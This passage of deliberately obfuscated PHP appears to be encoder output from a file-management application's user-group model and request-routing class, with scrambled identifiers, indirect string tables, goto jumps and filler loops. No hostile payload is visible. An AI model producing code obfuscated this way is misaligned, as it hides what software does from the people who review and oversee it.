array_sort_keep($„ ö©¨, $¾ìöö£[1823], $¡œ°’Ï); $this->_listDataApply($„ ö©¨); return $„ ö©¨; } public function listSearch($ˆÙ‚ŒÔÌ) { $ö÷Š‚¡Ì =& $_SERVER[Ôó‡è­ƒ]; $Ÿå’ÙÕ¢ = $ˆÙ‚ŒÔÌ[$ö÷Š‚¡Ì[1916]]; $áæÚÔ‰û = isset($ˆÙ‚ŒÔÌ[$ö÷Š‚¡Ì[1917]]) ? $ˆÙ‚ŒÔÌ[$ö÷Š‚¡Ì[1917]] : !1; if (!trim($Ÿå’ÙÕ¢)) { return !1; } $Ÿå’ÙÕ¢ = str_replace($ö÷Š‚¡Ì[1918], $ö÷Š‚¡Ì[1919], $Ÿå’ÙÕ¢); $Êâª×ÕÉ = array($ö÷Š‚¡Ì[1823] => array($ö÷Š‚¡Ì[382], "{$Ÿå’ÙÕ¢}\45"), $ö÷Š‚¡Ì[32] => array($ö÷Š‚¡Ì[382], "\x25{$Ÿå’ÙÕ¢}\x25"), $ö÷Š‚¡Ì[1000] => $ö÷Š‚¡Ì[1920]); if ($áæÚÔ‰û) { $“±­¸å = $this->getInfoSimple($áæÚÔ‰û); $ì¨®ÎÒ = $“±­¸å[$ö÷Š‚¡Ì[517]] . $áæÚÔ‰û . $ö÷Š‚¡Ì[544]; $Êâª×ÕÉ = array($Êâª×ÕÉ, array($ö÷Š‚¡Ì[517] => array($ö÷Š‚¡Ì[382], $ì¨®ÎÒ))); } $Êâª×ÕÉ = $this->parseWhereLike($Êâª×ÕÉ); $³¿âÀÕ† = $this->_makeOrder()->where($Êâª×ÕÉ)->selectPage(20); $³¿âÀÕ† = $³¿âÀÕ† ? $³¿âÀÕ† : array($ö÷Š‚¡Ì[368] => array(), $ö÷Š‚¡Ì[365] => array()); if (!$³¿âÀÕ† || count($³¿âÀÕ†[$ö÷Š‚¡Ì[368]]) < 5 && Input::check($Ÿå’ÙÕ¢, $ö÷Š‚¡Ì[317])) { $¢”â¸­é = $this->groupChildrenAll($áæÚÔ‰û); $ğá–Ÿ¹ = $this->_searchFromMeta($ö÷Š‚¡Ì[459], $Ÿå’ÙÕ¢, 10, $¢”â¸­é); $æüİğÇ’ = $this->_searchFromMeta($ö÷Š‚¡Ì[460], $Ÿå’ÙÕ¢, 10, $¢”â¸­é); $ÈåÔ Ø = array_merge($ğá–Ÿ¹, $æüİğÇ’, $³¿âÀÕ†[$ö÷Š‚¡Ì[368]]); $³¿âÀÕ†[$ö÷Š‚¡Ì[368]] = array_unique_by_key($ÈåÔ Ø, $ö÷Š‚¡Ì[1823]); $³¿âÀÕ†[$ö÷Š‚¡Ì[365]][$ö÷Š‚¡Ì[366]] = count($³¿âÀÕ†[$ö÷Š‚¡Ì[368]]); $³¿âÀÕ†[$ö÷Š‚¡Ì[365]][$ö÷Š‚¡Ì[367]] = ceil($³¿âÀÕ†[$ö÷Š‚¡Ì[365]][$ö÷Š‚¡Ì[366]] / $³¿âÀÕ†[$ö÷Š‚¡Ì[365]][$ö÷Š‚¡Ì[362]]); } $this->_listDataApply($³¿âÀÕ†[$ö÷Š‚¡Ì[368]]); return $³¿âÀÕ†; } protected function groupChildrenAll($®Ä©õ) { $ÖÊİË¼ì =& $_SERVER[Ôó‡è­ƒ]; if (!$®Ä©õ) { return !1; } if (is_string($®Ä©õ)) { $®Ä©õ = array($®Ä©õ); } $üñ“©¼À = $®Ä©õ; foreach ($®Ä©õ as $¤²¥») { $”‰Á”õÑ = $this->getInfoSimple($¤²¥»); $å–¶¤€ = array($ÖÊİË¼ì[517] => array($ÖÊİË¼ì[382], $”‰Á”õÑ[$ÖÊİË¼ì[517]] . $¤²¥» . $ÖÊİË¼ì[544])); $œãšéıİ = $this->field($ÖÊİË¼ì[1823])->where($å–¶¤€)->select(); $üñ“©¼À = array_merge($üñ“©¼À, array_to_keyvalue($œãšéıİ, $ÖÊİË¼ì[12], $ÖÊİË¼ì[1823])); } return array_unique($üñ“©¼À); } private function _searchFromMeta($Ş°É™Òœ, $ÓÚ¤Ñúº, $¬æÃÚÍ, $‰œªëŸ) { $Úªê¹»» =& $_SERVER[Ôó‡è­ƒ]; $ÓÚ¤Ñúº = strtolower($ÓÚ¤Ñúº); $úšªŸÄ = array($Úªê¹»»[95] => $Ş°É™Òœ, $Úªê¹»»[373] => array($Úªê¹»»[382], "\x25{$ÓÚ¤Ñúº}\x25")); $úšªŸÄ = $this->parseWhereLike($úšªŸÄ); if ($‰œªëŸ) { $úšªŸÄ[$Úªê¹»»[1823]] = array($Úªê¹»»[7], $‰œªëŸ); } $ô©õù´Õ = Model($Úªê¹»»[1921])->where($úšªŸÄ)->limit($¬æÃÚÍ)->select(); if (!$ô©õù´Õ) { return array(); } $ô©õù´Õ = array_to_keyvalue($ô©õù´Õ, $Úªê¹»»[12], $Úªê¹»»[1823]); $††ğ„£Î = $this->where(array($Úªê¹»»[1910] => array($Úªê¹»»[7], $ô©õù´Õ)))->select(); if (!$††ğ„£Î) { return array(); } return $††ğ„£Î; } protected function _listDataApplyItem($»Ú©‡‡«) { $äòÀ„µÂ = array($»Ú©‡‡«); $this->_listDataApply($äòÀ„µÂ); return $äòÀ„µÂ[0]; } protected function _listDataApply(&$Ò¬ü‹„) { $è¢â²† =& $_SERVER[Ôó‡è­ƒ]; if (!$Ò¬ü‹„) { return; } $ÍúÛ‹´¼ = array_to_keyvalue($Ò¬ü‹„, $è¢â²†[12], $è¢â²†[1823]); $this->_listAppendChildren($Ò¬ü‹„); $this->_listAppendChildrenMember($Ò¬ü‹„); $this->_listAppendMeta($Ò¬ü‹„, $ÍúÛ‹´¼); $this->_listAppendParent($Ò¬ü‹„); $this->_listAppendSourceRoot($Ò¬ü‹„, $ÍúÛ‹´¼); } private function _listAppendChildren(&$Í†õÙ­Š) { $Ÿ×•¯ß =& $_SERVER[Ôó‡è­ƒ]; $æ¿¾É– = array_to_keyvalue($Í†õÙ­Š, $Ÿ×•¯ß[12], $Ÿ×•¯ß[1823]); $È§®ş = array($Ÿ×•¯ß[494] => array($Ÿ×•¯ß[7], $æ¿¾É–)); $Æûê‡Åù = array($Ÿ×•¯ß[494], $Ÿ×•¯ß[1922] => $Ÿ×•¯ß[496]); $¾• ìî¥ = $this->field($Æûê‡Åù)->where($È§®ş)->group($Ÿ×•¯ß[494])->select(); $ò†â­¼É = array_to_keyvalue($¾• ìî¥, $Ÿ×•¯ß[494], $Ÿ×•¯ß[496]); foreach ($Í†õÙ­Š as &$“œóÀºƒ) { $¦Äˆì‹Ë = $“œóÀºƒ[$Ÿ×•¯ß[1823]]; $“œóÀºƒ[$Ÿ×•¯ß[1923]] = isset($ò†â­¼É[$¦Äˆì‹Ë]) ? intval($ò†â­¼É[$¦Äˆì‹Ë]) : !1; } unset($“œóÀºƒ); } private function _listAppendChildrenMember(&$Ğ…³ŠŠ) { $çôîäÜù =& $_SERVER[Ôó‡è­ƒ]; $Û‚›Çµè = array_to_keyvalue($Ğ…³ŠŠ, $çôîäÜù[12], $çôîäÜù[1823]); $¨›à³ö¿ = array($çôîäÜù[1823] => array($çôîäÜù[7], $Û‚›Çµè)); $¥ÂÅ¢âÏ = array($çôîäÜù[1823], $çôîäÜù[1922] => $çôîäÜù[496]); $­õ˜¬õÈ = Model($çôîäÜù[1912])->field($¥ÂÅ¢âÏ)->where($¨›à³ö¿)->group($çôîäÜù[1823])->select(); $¸ğ¢è = array_to_keyvalue($­õ˜¬õÈ, $çôîäÜù[1823], $çôîäÜù[496]); foreach ($Ğ…³ŠŠ as &$¡¯‚ÍÍ) { $¿ … ´Í = $¡¯‚ÍÍ[$çôîäÜù[1823]]; $¡¯‚ÍÍ[$çôîäÜù[1924]] = isset($¸ğ¢è[$¿ … ´Í]) ? intval($¸ğ¢è[$¿ … ´Í]) : !1; } unset($¡¯‚ÍÍ); } private function _listAppendMeta(&$Ú¶·Êï, $Ïà¢¼º¬) { $ğÖÒ¸±ğ =& $_SERVER[Ôó‡è­ƒ]; $»÷Êßãé = array($ğÖÒ¸±ğ[1823] => array($ğÖÒ¸±ğ[7], $Ïà¢¼º¬)); $‘­ü¿¦  = Model($ğÖÒ¸±ğ[1911])->where($»÷Êßãé)->select(); $‘­ü¿¦  = array_to_keyvalue_group($‘­ü¿¦ , $ğÖÒ¸±ğ[1823]); foreach ($‘­ü¿¦  as &$˜ª×îë¡) { $˜ª×îë¡ = array_to_keyvalue($˜ª×îë¡, $ğÖÒ¸±ğ[95], $ğÖÒ¸±ğ[373]); } unset($˜ª×îë¡); foreach ($Ú¶·Êï as &$ÓãîÉµ) { $ÓãîÉµ[$ğÖÒ¸±ğ[461]] = array(); if (isset($‘­ü¿¦ [$ÓãîÉµ[$ğÖÒ¸±ğ[1823]]])) { $ÓãîÉµ[$ğÖÒ¸±ğ[461]] = $‘­ü¿¦ [$ÓãîÉµ[$ğÖÒ¸±ğ[1823]]]; } } unset($ÓãîÉµ); } protected function parentLevelArray($ Ï·Â×À) { $‰­Ã’Ä² =& $_SERVER[Ôó‡è­ƒ]; $ Ï·Â×À = explode($‰­Ã’Ä²[50], trim($ Ï·Â×À, $‰­Ã’Ä²[50])); $ Ï·Â×À = array_remove_value($ Ï·Â×À, $‰­Ã’Ä²[194]); return $ Ï·Â×À; } private function _listAppendParent(&$Ì“¾·ÄÃ) { $ªšù±Âü =& $_SERVER[Ôó‡è­ƒ]; $«ÏèÀíË = array(); foreach ($Ì“¾·ÄÃ as &$”ÒÈ­¶ƒ) { $«ÏèÀíË[$”ÒÈ­¶ƒ[$ªšù±Âü[1823]]] = $”ÒÈ­¶ƒ[$ªšù±Âü[32]]; $ıùÄÂë = $this->parentLevelArray($”ÒÈ­¶ƒ[$ªšù±Âü[517]]); foreach ($ıùÄÂë as $¡­¤µü) { if (!isset($«ÏèÀíË[$¡­¤µü])) { $«ÏèÀíË[$¡­¤µü] = 0; } } } unset($”ÒÈ­¶ƒ); foreach ($«ÏèÀíË as $õë·Üú« => $¾Á”º™ú) { if ($¾Á”º™ú) { continue; } $ÚÃÁı¾ş = $this->getInfoSimple($õë·Üú«); $«ÏèÀíË[$õë·Üú«] = $ÚÃÁı¾ş[$ªšù±Âü[32]]; } $šäù––ã = $GLOBALS[$ªšù±Âü[6]][$ªšù±Âü[90]][$ªšù±Âü[1925]]; if ($GLOBALS[$ªšù±Âü[499]] == $ªšù±Âü[89]) { $šäù––ã = !1; } foreach ($Ì“¾·ÄÃ as &$”ÒÈ­¶ƒ) { $ıùÄÂë = $this->parentLevelArray($”ÒÈ­¶ƒ[$ªšù±Âü[517]]); $Úşº™Œ = $ªšù±Âü[12]; foreach ($ıùÄÂë as $õë·Üú« => $¡­¤µü) { if ($šäù––ã && $õë·Üú« == 0) { continue; } $Úşº™Œ .= $«ÏèÀíË[$¡­¤µü] . $ªšù±Âü[8]; } if ($ıùÄÂë) { $Úşº™Œ .= $”ÒÈ­¶ƒ[$ªšù±Âü[32]]; } $”ÒÈ­¶ƒ[$ªšù±Âü[522]] = str_replace($ªšù±Âü[525], $ªšù±Âü[8], $Úşº™Œ); } unset($”ÒÈ­¶ƒ); } private function _listAppendSourceRoot(&$Ì…ÏÓ–À, $ÙˆÛæÃÔ) { $ªÇúãó— =& $_SERVER[Ôó‡è­ƒ]; $»èäªÂ = Model($ªÇúãó—[823])->listSourceRoot(SourceModel::TYPE_GROUP, $ÙˆÛæÃÔ); $»èäªÂ = array_to_keyvalue($»èäªÂ, $ªÇúãó—[501]); $»èäªÂ = array_remove_key($»èäªÂ, $ªÇúãó—[501]); foreach ($Ì…ÏÓ–À as &$ÔËÊÃ™Ò) { $ÔËÊÃ™Ò[$ªÇúãó—[87]] = $»èäªÂ[$ÔËÊÃ™Ò[$ªÇúãó—[1823]]] ? $»èäªÂ[$ÔËÊÃ™Ò[$ªÇúãó—[1823]]] : array(); } unset($ÔËÊÃ™Ò); } protected function groupMerge($‹¬—æ§ú) { $‹¬—æ§ú = array_values(array_unique($‹¬—æ§ú)); $ÖÖ¼ÔùÅ = array(); for ($¡ÙƒŸï = 0; $¡ÙƒŸï < count($‹¬—æ§ú); $¡ÙƒŸï++) { $Êç—¬ö‡ = !1; for ($²áá†Ê¯ = 0; $²áá†Ê¯ < count($‹¬—æ§ú); $²áá†Ê¯++) { if ($¡ÙƒŸï == $²áá†Ê¯) { continue; } if ($this->isParentOf($‹¬—æ§ú[$²áá†Ê¯], $‹¬—æ§ú[$¡ÙƒŸï])) { $Êç—¬ö‡ = !0; break; } } if (!$Êç—¬ö‡) { $ÖÖ¼ÔùÅ[] = $‹¬—æ§ú[$¡ÙƒŸï]; } } return $ÖÖ¼ÔùÅ; } protected function isParentOf($Õ•“Ë›À, $†³×²î×) { $¯Ëûİé =& $_SERVER[Ôó‡è­ƒ]; if (!$Õ•“Ë›À || !$†³×²î× || $Õ•“Ë›À == $†³×²î×) { return !1; } $ô›à†—â = $this->getInfoSimple($Õ•“Ë›À); $İÁíëğô = $this->getInfoSimple($†³×²î×); $¾ÏûÆÙ‡ = $ô›à†—â[$¯Ëûİé[517]] . $Õ•“Ë›À . $¯Ëûİé[50]; if (substr($İÁíëğô[$¯Ëûİé[517]], 0, strlen($¾ÏûÆÙ‡)) == $¾ÏûÆÙ‡) { return !0; } return !1; } public function groupShowRoot($“İ•îü‰, $ŠÂâôÆ› = false) { $Ê ‰Ğôş =& $_SERVER[Ôó‡è­ƒ]; $š€¨ÉƒŒ = $this->getInfo($“İ•îü‰); if (!$š€¨ÉƒŒ) { return array(); } $õÎşşÏ™ = $this->parentLevelArray($š€¨ÉƒŒ[$Ê ‰Ğôş[517]]); $×ÜÁ’ = array($“İ•îü‰); if (count($õÎşşÏ™) == 0) { return $×ÜÁ’; } if ($ŠÂâôÆ› && count($õÎşşÏ™) == 1) { return $×ÜÁ’; } if (!$š€¨ÉƒŒ[$Ê ‰Ğôş[461]] || !isset($š€¨ÉƒŒ[$Ê ‰Ğôş[461]][$Ê ‰Ğôş[1908]]) || $š€¨ÉƒŒ[$Ê ‰Ğôş[461]][$Ê ‰Ğôş[1908]] == $Ê ‰Ğôş[1877]) { return $this->groupShowRoot($õÎşşÏ™[count($õÎşşÏ™) - 1], $ŠÂâôÆ›); } if ($š€¨ÉƒŒ[$Ê ‰Ğôş[461]][$Ê ‰Ğôş[1908]] == $Ê ‰Ğôş[356]) { $µ¿ÌÍ˜“ = explode($Ê ‰Ğôş[50], $š€¨ÉƒŒ[$Ê ‰Ğôş[461]][$Ê ‰Ğôş[1909]]); if ($µ¿ÌÍ˜“) { $×ÜÁ’ = array_merge($×ÜÁ’, $µ¿ÌÍ˜“); } } return $×ÜÁ’; } protected function resetParentLevel() { $áÚÓîÂã =& $_SERVER[Ôó‡è­ƒ]; $†°¢¶…Ÿ = $áÚÓîÂã[1823]; $Îƒš‡ = $this->select(); $Îƒš‡ = array_to_keyvalue($Îƒš‡, $†°¢¶…Ÿ); foreach ($Îƒš‡ as $êÄÎ¹â) { $²â¯îÍè = $êÄÎ¹â; $ğü…Úò = array(); while ($²â¯îÍè[$áÚÓîÂã[494]] != 0) { $ğü…Úò[] = $²â¯îÍè[$áÚÓîÂã[494]]; $²â¯îÍè = $Îƒš‡[$²â¯îÍè[$áÚÓîÂã[494]]]; } $ğü…Úò[] = 0; $ğü…Úò = $áÚÓîÂã[50] . implode($áÚÓîÂã[50], array_reverse($ğü…Úò)) . $áÚÓîÂã[50]; $this->setNamePinyin($êÄÎ¹â[$†°¢¶…Ÿ], $êÄÎ¹â[$áÚÓîÂã[32]]); $this->where(array($†°¢¶…Ÿ => $êÄÎ¹â[$†°¢¶…Ÿ]))->save(array($áÚÓîÂã[583] => $ğü…Úò)); } return $Îƒš‡; } public function groupNameAuto($ò‡Åœª, $“’™ÑÆ) { $Å¥»ø¢¢ =& $_SERVER[Ôó‡è­ƒ]; $“ŠŞëå† = $this->where(array($Å¥»ø¢¢[398] => $ò‡Åœª))->getField($Å¥»ø¢¢[32], !0); if (!$“ŠŞëå† || !in_array($“’™ÑÆ, $“ŠŞëå†)) { return $“’™ÑÆ; } for ($®§´‹ş» = 1; $®§´‹ş» <= count($“ŠŞëå†) + 1; $®§´‹ş»++) { $ò×Íü¯Ş = $“’™ÑÆ . "\50{$®§´‹ş»}\x29"; if (!in_array($ò×Íü¯Ş, $“ŠŞëå†)) { return $ò×Íü¯Ş; } } } public function groupSwitch($·âèÒ«†, $§«è‘Ï) { $¼¿óÔÑ =& $_SERVER[Ôó‡è­ƒ]; $÷Õ®ÊâŠ = array($¼¿óÔÑ[1823] => array($¼¿óÔÑ[7], array($·âèÒ«†, $§«è‘Ï))); $É©’İÌÅ = $this->where($÷Õ®ÊâŠ)->select(); $É©’İÌÅ = array_to_keyvalue($É©’İÌÅ, $¼¿óÔÑ[1823]); if (!isset($É©’İÌÅ[$·âèÒ«†]) || !isset($É©’İÌÅ[$§«è‘Ï]) || $É©’İÌÅ[$·âèÒ«†][$¼¿óÔÑ[494]] == 0) { return !1; } $÷Õ®ÊâŠ = array($¼¿óÔÑ[1823] => $·âèÒ«†); $ıİ¤ˆø€ = Model($¼¿óÔÑ[1912])->where($÷Õ®ÊâŠ)->select(); if (!$ıİ¤ˆø€) { $ıİ¤ˆø€ = array(); } foreach ($ıİ¤ˆø€ as $Û³ÏºèÏ) { $ëŞµ°‚ = $Û³ÏºèÏ[$¼¿óÔÑ[1655]]; $÷Õ®ÊâŠ = array($¼¿óÔÑ[1655] => $ëŞµ°‚, $¼¿óÔÑ[1823] => $§«è‘Ï); $õ÷¡®‡Ö = Model($¼¿óÔÑ[1912])->where($÷Õ®ÊâŠ)->find(); if (!$õ÷¡®‡Ö) { $ûõÊÉÓ° = array($§«è‘Ï => $Û³ÏºèÏ[$¼¿óÔÑ[1926]]); Model($¼¿óÔÑ[537])->userGroupAdd($ëŞµ°‚, $ûõÊÉÓ°); } Model($¼¿óÔÑ[537])->userGroupRemove($ëŞµ°‚, $·âèÒ«†); } $÷Õ®ÊâŠ = array($¼¿óÔÑ[408] => 2, $¼¿óÔÑ[494] => 0, $¼¿óÔÑ[407] => 1, $¼¿óÔÑ[501] => array($¼¿óÔÑ[7], array($·âèÒ«†, $§«è‘Ï))); $¯—˜ßğ = Model($¼¿óÔÑ[823])->where($÷Õ®ÊâŠ)->field($¼¿óÔÑ[1927])->select(); $¯—˜ßğ = array_to_keyvalue($¯—˜ßğ, $¼¿óÔÑ[501], $¼¿óÔÑ[399]); $Ìé ‘Ï’ = !empty($¯—˜ßğ[$·âèÒ«†]) ? $¯—˜ßğ[$·âèÒ«†] : !1; if ($Ìé ‘Ï’) { if (!$¯—˜ßğ[$§«è‘Ï]) { $¯—˜ßğ[$§«è‘Ï] = Model($¼¿óÔÑ[823])->groupRootAdd($§«è‘Ï); } $ÙÁğ®‰² = $¯—˜ßğ[$§«è‘Ï]; $÷Õ®ÊâŠ = array($¼¿óÔÑ[494] => $Ìé ‘Ï’); $¯—˜ßğ = Model($¼¿óÔÑ[823])->where($÷Õ®ÊâŠ)->field($¼¿óÔÑ[1928])->select(); if (!$¯—˜ßğ) { $¯—˜ßğ = array(); } Model($¼¿óÔÑ[823])->moveClearAuth = !1; foreach ($¯—˜ßğ as $ÜÆäó‘—) { $æÄ“ ©— = $ÜÆäó‘—[$¼¿óÔÑ[407]] == $¼¿óÔÑ[89] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($¼¿óÔÑ[823])->move($ÜÆäó‘—[$¼¿óÔÑ[399]], $ÙÁğ®‰², $æÄ“ ©—); } Model($¼¿óÔÑ[823])->moveClearAuth = !0; $÷Õ®ÊâŠ = array($¼¿óÔÑ[408] => 2, $¼¿óÔÑ[501] => $·âèÒ«†); $Ï¼öù• = array($¼¿óÔÑ[501] => $§«è‘Ï); Model($¼¿óÔÑ[1929])->where($÷Õ®ÊâŠ)->save($Ï¼öù•); Model($¼¿óÔÑ[1930])->where($÷Õ®ÊâŠ)->save($Ï¼öù•); } $this->_changeChildLevel($É©’İÌÅ[$·âèÒ«†], $É©’İÌÅ[$§«è‘Ï], !0); $this->where(array($¼¿óÔÑ[494] => $·âèÒ«†))->save(array($¼¿óÔÑ[494] => $§«è‘Ï)); $this->_clearChildrenCache($É©’İÌÅ[$§«è‘Ï]); return !0; } } goto C–Á³‡à‹; C¿©ïÑ¨š: class Application { private $defaultModule = "\x69\156\x64\x65\170"; private $defaultController = "\151\156\144\x65\170"; private $defaultAction = "\151\x6e\144\145\x78"; function __construct() { } public function setDefault($©ÀğÍó) { $¯­²ô¯÷ =& $_SERVER[Ôó‡è­ƒ]; $‡à–«à =& $_SERVER[¶—·¥ù®]; $·²Ø‹ó‘ = explode($‡à–«à[0], trim($©ÀğÍó, $‡à–«à[0])); $¬ş—¥· = $¯­²ô¯÷[610]; if (strlen($¬ş—¥·) < $¯­²ô¯÷[606]) { return; } $this->defaultModule = $·²Ø‹ó‘[0] ? $·²Ø‹ó‘[0] : $this->defaultModule; $ê³õ‹ = $¯­²ô¯÷[611]; $this->defaultController = $·²Ø‹ó‘[1] ? $·²Ø‹ó‘[1] : $this->defaultController; $»ÑúÄÚ­ = $¯­²ô¯÷[612]; if (strlen($»ÑúÄÚ­) < $¯­²ô¯÷[613]) { return; } $this->defaultAction = $·²Ø‹ó‘[2] ? $·²Ø‹ó‘[2] : $this->defaultAction; $this->yenf8d3d015a($‡à–«à[1], array($this, $‡à–«à[2])); $ï“ô‰àß = $¯­²ô¯÷[614]; } public function appRun($üŞúª˜æ) { $³Õ÷¾Û =& $_SERVER[Ôó‡è­ƒ]; $™ÍÇÒá =& $_SERVER[¶—·¥ù®]; $°Ã•şß“ = explode($™ÍÇÒá[0], $üŞúª˜æ); $èœÏûòÀ = strtolower($°Ã•şß“[0]); $®É´é¬ã = $³Õ÷¾Û[615]; $‚•ğúº = $™ÍÇÒá[3]; if ($èœÏûòÀ == $™ÍÇÒá[4]) { $‚•ğúº = $™ÍÇÒá[5]; $°Ã•şß“[0] = $™ÍÇÒá[6]; $°Ã•şß“[1] = $°Ã•şß“[1] . $™ÍÇÒá[7]; $üŞúª˜æ = join($™ÍÇÒá[0], $°Ã•şß“); $üŞúª˜æ = trim($üŞúª˜æ, $™ÍÇÒá[0]); } call_user_func(array($™ÍÇÒá[8], $™ÍÇÒá[9]), $‚•ğúº . $™ÍÇÒá[10], $üŞúª˜æ); ActionCall($üŞúª˜æ); call_user_func(array($™ÍÇÒá[8], $™ÍÇÒá[9]), $‚•ğúº . $™ÍÇÒá[11], $üŞúª˜æ); $åÄ‹ù—» = $³Õ÷¾Û[616]; while (strlen($åÄ‹ù—») < $³Õ÷¾Û[617]) { if (!$åÄ‹ù—») { break; } $åÄ‹ù—»++; } } private function autorun() { $Í‘Ü­š€ =& $_SERVER[¶—·¥ù®]; global $config; if (count($config[$Í‘Ü­š€[12]]) == 0) { return; } foreach ($config[$Í‘Ü­š€[12]] as $÷Š’åñ‡ => $³¦ ªï) { $this->appRun($³¦ ªï); } } private function pobyc489b960() { $¶Éµ™— =& $_SERVER[Ôó‡è­ƒ]; $ÇÍ Ş¬ =& $_SERVER[¶—·¥ù®]; $İæó’é = $ÇÍ Ş¬[4]; $º›Ä²Ÿ­ = $GLOBALS[$ÇÍ Ş¬[13]][$ÇÍ Ş¬[14]][0]; $Õ†’€éà = $¶Éµ™—[618]; if (!$º›Ä²Ÿ­ || strlen($º›Ä²Ÿ­) <= strlen($İæó’é)) { return; } if (strtolower(substr($º›Ä²Ÿ­, -strlen($İæó’é))) != $İæó’é) { return; } $ÔÜÚœ¤Š = substr($º›Ä²Ÿ­, 0, -strlen($İæó’é)); $¸ŠÍ‚†í = array($ÇÍ Ş¬[4], $ÔÜÚœ¤Š); $Äñ¡®Ãá = array_slice($GLOBALS[$ÇÍ Ş¬[13]][$ÇÍ Ş¬[14]], 1); $ÈÖñÙ×“ = $¶Éµ™—[619]; if (strlen($ÈÖñÙ×“) < $¶Éµ™—[620]) { return; } $GLOBALS[$ÇÍ Ş¬[13]][$ÇÍ Ş¬[14]] = array_merge($¸ŠÍ‚†í, $Äñ¡®Ãá); $¾£šˆòã = $¶Éµ™—[621]; while (strlen($¾£šˆòã) < $¶Éµ™—[617]) { if (!$¾£šˆòã) { break; } $¾£šˆòã++; } $GLOBALS[$ÇÍ Ş¬[13]][$ÇÍ Ş¬[15]] = implode($ÇÍ Ş¬[0], $GLOBALS[$ÇÍ Ş¬[13]][$ÇÍ Ş¬[14]]); } private function rdcab83fc8e1() { $©óÈ©—å =& $_SERVER[Ôó‡è­ƒ]; $¯†ß»á =& $_SERVER[¶—·¥ù®]; if ($GLOBALS[$¯†ß»á[13]][$¯†ß»á[15]] != $¯†ß»á[6]) { return; } $ÖÌİº­Ñ = $_SERVER[$¯†ß»á[16]]; $Éîîş€— = $©óÈ©—å[622]; if (strlen($Éîîş€—) < $©óÈ©—å[606]) { return; } $·®‹Åˆ° = $¯†ß»á[17]; if (!strstr($ÖÌİº­Ñ, $·®‹Åˆ°)) { return; } $‚ÊˆÊµ¹ = strrpos($ÖÌİº­Ñ, $·®‹Åˆ°); $Å¨ªÑ¬” = $©óÈ©—å[623]; $ÁÄòäó = substr($ÖÌİº­Ñ, $‚ÊˆÊµ¹ + strlen($·®‹Åˆ°)); $±‰Ÿ¤ã¦ = $©óÈ©—å[624]; preg_match_all($¯†ß»á[18], $ÁÄòäó, $¢Ë²ßÁª); $óÁ˜§±’ = $©óÈ©—å[625]; if (!$óÁ˜§±’) { die; } $ÁÄòäó = trim($¢Ë²ßÁª[0][0], $¯†ß»á[19]); $GLOBALS[$¯†ß»á[13]][$¯†ß»á[14]] = explode($¯†ß»á[19], $ÁÄòäó); $GLOBALS[$¯†ß»á[13]][$¯†ß»á[15]] = implode($¯†ß»á[0], $GLOBALS[$¯†ß»á[13]][$¯†ß»á[14]]); $°¾“Ô„Ä = $©óÈ©—å[626]; while ($°¾“Ô„Ä < $©óÈ©—å[627]) { if ($°¾“Ô„Ä >= 0) { break; } $°¾“Ô„Ä++; } } public function run() { $…›Ä·ñç =& $_SERVER[Ôó‡è­ƒ]; $ÚÛüÉ˜ç =& $_SERVER[¶—·¥ù®]; $this->rdcab83fc8e1(); $ñ€Ÿ¼…É = $…›Ä·ñç[628]; if (!$ñ€Ÿ¼…É) { return; } $this->pobyc489b960(); $ß¤ù¸ŠË = $GLOBALS[$ÚÛüÉ˜ç[13]][$ÚÛüÉ˜ç[14]]; $ŠıúåŸ = $GLOBALS[$ÚÛüÉ˜ç[13]][$ÚÛüÉ˜ç[15]]; define($ÚÛüÉ˜ç[20], isset($ß¤ù¸ŠË[0]) && $ß¤ù¸ŠË[0] ? $ß¤ù¸ŠË[0] : $this->defaultModule); define($ÚÛüÉ˜ç[21], isset($ß¤ù¸ŠË[1]) && $ß¤ù¸ŠË[0] ? $ß¤ù¸ŠË[1] : $this->defaultController); $Ğ êˆ‘Ä = $…›Ä·ñç[629]; if (strlen($Ğ êˆ‘Ä) < $…›Ä·ñç[620]) { die; } define($ÚÛüÉ˜ç[22], isset($ß¤ù¸ŠË[2]) && $ß¤ù¸ŠË[0] ? $ß¤ù¸ŠË[2] : $this->defaultAction); define($ÚÛüÉ˜ç[23], MOD . $ÚÛüÉ˜ç[0] . ST . $ÚÛüÉ˜ç[0] . ACT); $‹û¸¿Ğ = $…›Ä·ñç[630]; while (strlen($‹û¸¿Ğ) < $…›Ä·ñç[620]) { if (!$‹û¸¿Ğ) { break; } $‹û¸¿Ğ++; } $_SERVER[$ÚÛüÉ˜ç[24]] = strtolower(ACTION); $¯Ä”ı¹İ = $…›Ä·ñç[631]; if (!$¯Ä”ı¹İ) { return; } $this->autorun(); if (count($ß¤ù¸ŠË) >= 3) { $this->appRun($ŠıúåŸ); } else { $this->appRun(ACTION); } } private $qeboc5fe3526 = array(); private $smqo82c58de6 = ''; public function uclaee977ec3() { $µìÑñ‰ =& $_SERVER[Ôó‡è­ƒ]; $Û´×Ì¨” =& $_SERVER[¶—·¥ù®]; $this->vcipe2275bad(); $Şö¥®· = $µìÑñ‰[632]; while (strlen($Şö¥®·) < $µìÑñ‰[613]) { if (!$Şö¥®·) { break; } $Şö¥®·++; } $this->lhop11a77064(); $this->cemd7d51f6dc(); $¹Õíßç‘ = $µìÑñ‰[633]; if (strlen($¹Õíßç‘) < $µìÑñ‰[620]) { return; } $this->vnkc963765e8(); $ıÙßˆÑ¡ = $µìÑñ‰[634]; $this->wsrod3df1a29(); $ˆñ´šŸñ = $µìÑñ‰[635]; if (!$ˆñ´šŸñ) { die; } $this->badoe3837847(); $this->whkj579d7f30(); $this->yenf8d3d015a($Û´×Ì¨”[25], array($this, $Û´×Ì¨”[26])); $½ŞÊšÙ = $µìÑñ‰[636]; while (strlen($½ŞÊšÙ) < $µìÑñ‰[606]) { if (!$½ŞÊšÙ) { break; } $½ŞÊšÙ++; } $this->yenf8d3d015a($Û´×Ì¨”[27], array($this, $Û´×Ì¨”[28])); $Š•²×ÛÒ = $µìÑñ‰[637]; if (strlen($Š•²×ÛÒ) < $µìÑñ‰[627]) { die; } $this->yenf8d3d015a($Û´×Ì¨”[29], array($this, $Û´×Ì¨”[30])); $›Øûñ…á = $µìÑñ‰[638]; if (!$›Øûñ…á) { die; } $this->yenf8d3d015a($Û´×Ì¨”[31], array($this, $Û´×Ì¨”[32])); } public function eoqa645b5705($Ó£¤Ä“Š) { $¶•çŞÈÇ =& $_SERVER[Ôó‡è­ƒ]; $ºÑÓøÙç =& $_SERVER[¶—·¥ù®]; $¥ä‡Åˆä = Model($ºÑÓøÙç[33])->get(); $– ÄøØ = array($ºÑÓøÙç[34], $ºÑÓøÙç[35], $ºÑÓøÙç[36], $ºÑÓøÙç[37], 